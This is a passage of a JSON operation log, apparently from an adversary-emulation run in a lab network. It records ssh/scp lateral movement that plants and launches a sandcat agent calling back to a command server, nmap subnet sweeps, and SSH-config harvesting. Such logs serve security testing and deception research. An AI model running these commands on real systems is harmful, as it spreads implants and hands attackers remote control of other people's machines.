StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 employeeB@192.168.201.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux employeeB@192.168.201.4:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 employeeB@192.168.201.4 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "status": 0, "score": 7, "decide": "2024-04-26T23:47:57Z", "pin": 0, "pid": "1512", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.4", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.4", "created": "2024-04-26T23:47:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.useremployeeB", "trait": "host.lateralMove.user", "name": "host.lateralMove.user", "value": "employeeB", "created": "2024-04-26T23:47:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.port22", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": "22", "created": "2024-04-26T23:47:57Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "0a50b86c-cd63-48e2-b97a-337f8ade68bc", "collect": "2024-04-26T23:47:57Z", "finish": "2024-04-26T23:47:59Z", "ability": {"ability_id": "deception-ssh-copy", "tactic": "deception-lateral-movement", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh (passwordless)", "description": "Copy 54ndc47 to remote host and start it", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:47:57Z"}, {"id": "b3e45ac5-32db-4e54-9c72-191f696f7f87", "paw": "dagwxr", "command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseA@192.168.201.5:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "plaintext_command": "scp -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux databaseA@192.168.201.5:~/sandcat.go && ssh -p 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 databaseA@192.168.201.5 'nohup ./sandcat.go -server http://10.20.20.1:8888 -group red 1>/dev/null 2>/dev/null &'", "status": 0, "score": 7, "decide": "2024-04-26T23:48:07Z", "pin": 0, "pid": "1516", "facts": [], "relationships": [], "used": [{"unique": "host.lateralMove.ip192.168.201.5", "trait": "host.lateralMove.ip", "name": "host.lateralMove.ip", "value": "192.168.201.5", "created": "2024-04-26T23:48:07Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.userdatabaseA", "trait": "host.lateralMove.user", "name": "host.lateralMove.user", "value": "databaseA", "created": "2024-04-26T23:48:07Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}, {"unique": "host.lateralMove.port22", "trait": "host.lateralMove.port", "name": "host.lateralMove.port", "value": "22", "created": "2024-04-26T23:48:07Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": ["dagwxr"], "technique_id": null}], "unique": "b3e45ac5-32db-4e54-9c72-191f696f7f87", "collect": "2024-04-26T23:48:07Z", "finish": "2024-04-26T23:48:09Z", "ability": {"ability_id": "deception-ssh-copy", "tactic": "deception-lateral-movement", "technique_name": "Remote Services: SSH", "technique_id": "T1021.004", "name": "Deception copy and start agent over ssh (passwordless)", "description": "Copy 54ndc47 to remote host and start it", "executors": [{"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-lateral-movement"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "scp -P #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 sandcat.go-linux #{host.lateralMove.user}@#{host.lateralMove.ip}:~/sandcat.go && ssh -p #{host.lateralMove.port} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 #{host.lateralMove.user}@#{host.lateralMove.ip} 'nohup ./sandcat.go -server #{server} -group red 1>/dev/null 2>/dev/null &'", "code": null, "language": null, "build_target": null, "payloads": ["sandcat.go-linux"], "uploads": [], "timeout": 15, "parsers": [], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "webserver-c", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:48:07Z"}, {"id": "0cf2bc77-6797-4fa9-9497-a42aecf96235", "paw": "tkawqx", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "plaintext_command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "status": 0, "score": 0, "decide": "2024-04-26T23:48:17Z", "pin": 0, "pid": "1553", "facts": [], "relationships": [], "used": [], "unique": "0cf2bc77-6797-4fa9-9497-a42aecf96235", "collect": "2024-04-26T23:48:19Z", "finish": "2024-04-26T23:48:28Z", "ability": {"ability_id": "deception-parse-sshconfig", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Parse SSH Config", "description": "Uses stormssh to parse the ssh config file", "executors": [{"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "pip3 install pyopenssl --upgrade; pip3 install stormssh; ~/.local/bin/storm list", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.ssh", "parserconfigs": [{"source": "remote.ssh.cmd", "edge": "", "target": "", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:48:19Z"}, {"id": "d36922cd-1c79-4c94-97e4-1a5a7df89d26", "paw": "tkawqx", "command": "ls -l /home/employeeB/", "plaintext_command": "ls -l /home/employeeB/", "status": 0, "score": 1, "decide": "2024-04-26T23:48:32Z", "pin": 0, "pid": "1574", "facts": [{"unique": "host.dir.path/home/employeeB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeB/", "created": "2024-04-26T23:48:32Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["d36922cd-1c79-4c94-97e4-1a5a7df89d26"], "relationships": ["host.dir.path(/home/employeeB/) : has_contents : host.dir.files(['/home/employeeB/sandcat.go'])"], "limit_count": -1, "collected_by": ["tkawqx"], "technique_id": null}, {"unique": "host.dir.files['/home/employeeB/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/employeeB/sandcat.go"], "created": "2024-04-26T23:48:34Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["d36922cd-1c79-4c94-97e4-1a5a7df89d26"], "relationships": ["host.dir.path(/home/employeeB/) : has_contents : host.dir.files(['/home/employeeB/sandcat.go'])"], "limit_count": -1, "collected_by": ["tkawqx"], "technique_id": "T9012"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf4c970d0>has_contents<app.objects.secondclass.c_fact.Fact object at 0x7f5cf48c8a60>", "source": {"unique": "host.dir.path/home/employeeB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeB/", "created": "2024-04-26T23:48:32Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["d36922cd-1c79-4c94-97e4-1a5a7df89d26"], "relationships": ["host.dir.path(/home/employeeB/) : has_contents : host.dir.files(['/home/employeeB/sandcat.go'])"], "limit_count": -1, "collected_by": ["tkawqx"], "technique_id": null}, "edge": "has_contents", "target": {"unique": "host.dir.files['/home/employeeB/sandcat.go']", "trait": "host.dir.files", "name": "host.dir.files", "value": ["/home/employeeB/sandcat.go"], "created": "2024-04-26T23:48:34Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "host.dir.path/home/employeeB/", "trait": "host.dir.path", "name": "host.dir.path", "value": "/home/employeeB/", "created": "2024-04-26T23:48:32Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": ["d36922cd-1c79-4c94-97e4-1a5a7df89d26"], "relationships": ["host.dir.path(/home/employeeB/) : has_contents : host.dir.files(['/home/employeeB/sandcat.go'])"], "limit_count": -1, "collected_by": ["tkawqx"], "technique_id": null}], "unique": "d36922cd-1c79-4c94-97e4-1a5a7df89d26", "collect": "2024-04-26T23:48:34Z", "finish": "2024-04-26T23:48:34Z", "ability": {"ability_id": "deception-ls", "tactic": "utility", "technique_name": "Deception Enum Folders", "technique_id": "T9012", "name": "Enumerate all folders withing a directory", "description": "Enumerates all folders within a directory", "executors": [{"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["utility"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "ls -l #{host.dir.path}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 15, "parsers": [{"module": "plugins.deception.app.parsers.ls", "parserconfigs": [{"source": "host.dir.path", "edge": "has_children", "target": "host.dir.contents", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:48:34Z"}, {"id": "47fd5207-03ae-4378-afa1-84f0e7a890d7", "paw": "tkawqx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.202.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:48:37Z", "pin": 0, "pid": "1576", "facts": [{"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:39:22Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["527e0f53-965b-492f-b99c-ef0b203dd210", "7a846efd-64e1-4d5f-acaf-b7f0daf27897", "95c7474e-c9af-4a1b-9305-1b4d6df22d65", "fc9592ce-36cb-47f3-99f7-3396c423f28b", "27eea4c0-3b4f-40a9-a774-6b3e6c289dd0", "47fd5207-03ae-4378-afa1-84f0e7a890d7", "d8bd914e-39d8-44fc-b217-7182f38229b6", "c144d9fb-7334-4baa-9c4c-427c5aa2f2b2"], "relationships": ["host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.1', '192.168.202.2', '192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.202.3'])", "host.subnet.ipaddrs(192.168.202.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46de5f0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46dfa30>", "source": {"unique": "host.subnet.ipaddrs192.168.202.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.202.0/24", "created": "2024-04-26T23:48:51Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs[]", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": [], "created": "2024-04-26T23:48:51Z", "score": 1, "source": null, "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.202.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.202.0/24", "created": "2024-04-26T23:48:37Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "47fd5207-03ae-4378-afa1-84f0e7a890d7", "collect": "2024-04-26T23:48:40Z", "finish": "2024-04-26T23:48:51Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:48:40Z"}, {"id": "af654b8a-e076-47fb-8564-6b40300f2c80", "paw": "tkawqx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.200.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:48:52Z", "pin": 0, "pid": "1578", "facts": [{"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:39:35Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["7095ef06-22b7-4473-b807-91ba0dea838b", "e9c873ff-de3a-4d7e-a279-7ba20d4f2eb8", "3e0385dd-eadf-4b80-bc55-4aea1b79aa80", "832fe5d7-e203-4479-a83f-25bc8c762719", "56bc1feb-a57e-470e-837b-9173b738d06d", "af654b8a-e076-47fb-8564-6b40300f2c80", "e2eb1c16-cff6-4a6a-9aa0-ddd3abc9ffa6", "1bb1488d-c40c-47f1-888c-97fe1a623b17"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])", "host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.2', '192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:48:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["af654b8a-e076-47fb-8564-6b40300f2c80"], "relationships": ["host.subnet.ipaddrs(192.168.200.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.200.3', '192.168.200.4', '192.168.200.5'])"], "limit_count": -1, "collected_by": ["tkawqx"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46af460>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf46aecb0>", "source": {"unique": "host.subnet.ipaddrs192.168.200.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.200.0/24", "created": "2024-04-26T23:48:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.200.3', '192.168.200.4', '192.168.200.5']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.200.3", "192.168.200.4", "192.168.200.5"], "created": "2024-04-26T23:48:59Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.200.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.200.0/24", "created": "2024-04-26T23:48:52Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "af654b8a-e076-47fb-8564-6b40300f2c80", "collect": "2024-04-26T23:48:56Z", "finish": "2024-04-26T23:48:59Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}, "cleanup": 0, "visibility": {"score": 50, "adjustments": []}, "host": "employee-b", "output": "True", "deadman": false, "agent_reported_time": "2024-04-26T23:48:56Z"}, {"id": "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "paw": "tkawqx", "command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "plaintext_command": "nmap --max-rtt-timeout 100ms -sn -oX - 192.168.201.0/24", "status": 0, "score": 1, "decide": "2024-04-26T23:49:02Z", "pin": 0, "pid": "1580", "facts": [{"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:40:02Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["8820d7db-0ef2-44ef-8197-501e8ee3c43b", "e07921d6-b9e1-4277-a4d0-c12a3109baa4", "26f46d4f-0c48-4952-99b4-e4a3766799fb", "e9bb737a-d6f7-43ce-a28f-c824629a61a9", "34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs([])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])", "host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["rezmky", "czljvk", "cxfxwj", "dagwxr", "etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}, {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:47:28Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": "LEARNED", "links": ["34eeee8c-eb81-48c0-8e26-c4c4a97e4f3f", "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "9511e310-83f1-4fdd-a60e-24b1d7b4c545", "67271bd6-f418-4a31-8ac9-adfbbf7e97f4"], "relationships": ["host.subnet.ipaddrs(192.168.201.0/24) : has_online_ipaddrs : host.subnet.online_ipaddrs(['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90'])"], "limit_count": -1, "collected_by": ["etrrtg", "tkawqx", "qysmha", "cfisqp"], "technique_id": "T1021.006"}], "relationships": [{"unique": "<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d3f0>has_online_ipaddrs<app.objects.secondclass.c_fact.Fact object at 0x7f5cf452d090>", "source": {"unique": "host.subnet.ipaddrs192.168.201.0/24", "trait": "host.subnet.ipaddrs", "name": "host.subnet.ipaddrs", "value": "192.168.201.0/24", "created": "2024-04-26T23:49:07Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "edge": "has_online_ipaddrs", "target": {"unique": "host.subnet.online_ipaddrs['192.168.201.2', '192.168.201.3', '192.168.201.4', '192.168.201.5', '192.168.201.6', '192.168.201.82', '192.168.201.90']", "trait": "host.subnet.online_ipaddrs", "name": "host.subnet.online_ipaddrs", "value": ["192.168.201.2", "192.168.201.3", "192.168.201.4", "192.168.201.5", "192.168.201.6", "192.168.201.82", "192.168.201.90"], "created": "2024-04-26T23:49:07Z", "score": 1, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}, "score": 1, "origin": "fdfc000a-c2fa-4222-851c-bee3c674fda8"}], "used": [{"unique": "scan.subnet.addr192.168.201.0/24", "trait": "scan.subnet.addr", "name": "scan.subnet.addr", "value": "192.168.201.0/24", "created": "2024-04-26T23:49:02Z", "score": 2, "source": "fdfc000a-c2fa-4222-851c-bee3c674fda8", "origin_type": null, "links": [], "relationships": [], "limit_count": -1, "collected_by": [], "technique_id": null}], "unique": "27cfc0cb-e7a4-4693-b6d3-fd1cf6d43abb", "collect": "2024-04-26T23:49:04Z", "finish": "2024-04-26T23:49:07Z", "ability": {"ability_id": "deception-nmapsubnet", "tactic": "deception-data-collection", "technique_name": "TODO", "technique_id": "T1021.006", "name": "Deception Nmap subnet", "description": "Scans a subnet for active ip addresses", "executors": [{"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": "has_online_ipaddrs", "target": "host.subnet.online_ipaddrs", "custom_parser_vals": {}}]}], "cleanup": [], "variations": [], "additional_info": {}}], "requirements": [], "privilege": null, "repeatable": true, "buckets": ["deception-data-collection"], "additional_info": {}, "access": {}, "singleton": false, "plugin": "deception", "delete_payload": true}, "executor": {"name": "sh", "platform": "linux", "command": "nmap --max-rtt-timeout 100ms -sn -oX - #{scan.subnet.addr}", "code": null, "language": null, "build_target": null, "payloads": [], "uploads": [], "timeout": 60, "parsers": [{"module": "plugins.deception.app.parsers.nmapsubnet", "parserconfigs": [{"source": "host.subnet.ipaddrs", "edge": 